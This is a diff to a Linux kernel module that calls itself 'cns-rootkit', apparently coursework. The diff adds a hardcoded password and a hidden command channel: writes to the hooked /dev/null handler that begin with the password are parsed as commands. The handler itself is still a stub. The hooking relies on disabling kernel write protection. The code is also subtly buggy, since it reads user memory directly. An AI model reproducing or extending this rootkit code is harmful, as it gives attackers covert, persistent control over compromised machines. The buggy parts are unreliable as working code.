@@ -4,6 +4,7 @@
 #include <linux/list.h>
 #include <linux/fs.h>
 #include <linux/slab.h>
+#include <linux/string.h>
 
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
@@ -18,6 +19,9 @@
 
 MODULE_LICENSE("MIT");
 MODULE_AUTHOR("SAV");
+
+#define PASSWORD "HohoHaha"
+#define CMD1 "cmd1"
 
 struct hook {
   void *original_function;
@@ -92,13 +96,24 @@ struct file_operations *get_fops(char *path) {
   return fop;
 }
 
-int establish_comm_channel(void);
-int unestablish_comm_channel(void);
+void command_execute(char __user *buf, size_t count) {
+  if(count <= sizeof(PASSWORD) || strncmp(buf, PASSWORD, sizeof(PASSWORD)) != 0) return;
 
-ssize_t cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);
+  printk(KERN_INFO "cns-rootkit: command password passed\n");
+
+  buf += sizeof(PASSWORD);
+
+  if(strncmp(buf, CMD1, sizeof(CMD1)) == 0) {
+    printk(KERN_INFO "cns-rootkit: got command1\n");
+    // call some function here
+  } else {
+    printk(KERN_INFO "cns-rootkit: got unknown command\n");
+  }
+}
 
 ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
-  printk(KERN_INFO "cns-rootkit: In my /dev/null write with %s\n", buf);
+  printk(KERN_INFO "cns-rootkit: In my /dev/null\n", buf);
+  command_execute(buf, count);
   ssize_t (*original_dev_null_write) (struct file *filep, char __user *buf, size_t count, loff_t *p);
   original_dev_null_write = hook_unpatch((void *) cns_rootkit_dev_null_write);
   ssize_t res =  original_dev_null_write(filep, buf, count, p);
